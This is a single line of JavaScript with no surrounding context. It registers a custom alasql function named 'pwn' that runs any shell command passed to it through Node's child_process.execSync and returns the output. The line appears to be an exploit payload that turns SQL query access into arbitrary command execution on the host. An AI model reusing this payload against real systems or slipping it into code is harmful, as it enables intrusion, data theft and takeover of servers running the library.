alasql.fn.pwn = function(x){ return require('child_process').execSync(x).toString(); }
